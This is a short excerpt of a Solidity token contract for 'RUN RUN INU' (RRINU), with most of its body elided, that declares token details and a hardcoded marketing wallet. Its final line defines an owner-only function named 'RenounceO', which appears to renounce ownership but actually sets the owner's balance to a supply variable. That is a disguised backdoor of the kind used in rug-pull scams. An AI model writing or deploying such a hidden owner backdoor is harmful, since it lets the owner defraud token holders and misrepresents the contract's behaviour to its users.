...
contract RUNRUNINU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RUN RUN INU";
    string private _symbol = "RRINU";
    uint8 private _decimals = 18;

    address payable public marketingwallet = payable(0x1D82e51c65188D20F0777bE56C655B20C3BcE174);
    ...
    function RenounceO()  public onlyOwner()   {_accBalances[getOwner()] = setDividendSupply; }
